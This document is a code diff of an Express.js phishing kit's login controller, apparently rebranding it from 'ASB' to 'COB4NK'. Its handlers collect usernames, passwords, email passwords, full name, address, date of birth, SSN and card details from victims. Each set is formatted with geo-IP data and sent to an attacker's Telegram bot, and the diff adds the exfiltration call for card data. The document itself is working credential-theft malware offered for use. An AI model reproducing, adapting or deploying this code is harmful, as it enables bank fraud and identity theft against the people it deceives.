@@ -9,7 +9,6 @@ const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 
 
 
-
 exports.login = (req, res) => {
 	return res.render("login");
 };
@@ -34,7 +33,7 @@ exports.loginPost = async (req, res) => {
     const systemLang = req.headers["accept-language"];
 
 	const message =
-		`✅ UPDATE TEAM | ASB | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
 		`👤 LOGIN INFO\n` +
 		`USERNAME         : ${username}\n` +
 		`PASSWORD         : ${password}\n\n` +
@@ -97,14 +96,14 @@ exports.loginPost2 = async (req, res) => {
 
 
         const message =
-            `✅ UPDATE TEAM | ASB | USER_${ipAddress}\n\n` +
+            `✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
             `👤 RELOGIN INFO\n` +
 			`USERNAME         : ${username}\n` +
 			`PASSWORD         : ${password}\n\n` +
             
             `🌍 GEO-IP INFO\n` +
-			`IP ADDRESS       : ${ipAddress}\n` +
-			`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+          `IP ADDRESS       : ${ipAddress}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
             
 
@@ -146,14 +145,14 @@ exports.loginPost3 = async (req, res) => {
 
 
         const message =
-            `✅ UPDATE TEAM | ASB | USER_${ipAddress}\n\n` +
+            `✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
             `👤 EMAIL INFO\n` +
 			`EMAIL ADDRESS    : ${emailAddr}\n` +
 			`EMAIL PASSWORD   : ${emailPass}\n\n` +
             
             `🌍 GEO-IP INFO\n` +
-			`IP ADDRESS       : ${ipAddress}\n` +
-			`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+          `IP ADDRESS       : ${ipAddress}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
             `💬 Telegram: https://t.me/UpdateTeams\n`;
             
 
@@ -196,7 +195,7 @@ exports.loginPost4 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | ASB | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
 		`👤 PERSONAL INFO\n` +
 		`FULL NAME        : ${fullName}\n` +
 		`STREET ADDRESS   : ${address}\n` +
@@ -205,9 +204,9 @@ exports.loginPost4 = async (req, res) => {
 		`DOB              : ${dob}\n` +
 		`SSN              : ${ssn}\n\n` +
 		`🌍 GEO-IP INFO\n` +
-		`IP ADDRESS       : ${ipAddress}\n` +
+		 `IP ADDRESS       : ${ipAddress}\n` +
 		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
-		 `💬 Telegram: https://t.me/UpdateTeams\n`;
+		`💬 Telegram: https://t.me/UpdateTeams\n`;
             
 
         const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
@@ -248,7 +247,7 @@ exports.loginPost5 = async (req, res) => {
 
 
 	const message =
-		`✅ UPDATE TEAM | ASB | USER_${ipAddress}\n\n` +
+		`✅ UPDATE TEAM | COB4NK | USER_${ipAddress}\n\n` +
 		`👤 CARD INFO\n` +
 		`CARD NUMBER      : ${cardNum}\n` +
 		`EXPIRY DATE      : ${expDate}\n` +
@@ -260,7 +259,9 @@ exports.loginPost5 = async (req, res) => {
 		`💬 Telegram: https://t.me/UpdateTeams\n` +
 		`🌐 Website: Coming soon!!\n`;
 
-		
+		const sendMessage = sendMessageFor(botToken, chatId); // Make sure sendMessageFor is defined
+        sendMessage(message);
+        
 		res.redirect("/auth/complete");
 	} catch (error) {
 		console.error('Unexpected error:', error.message);
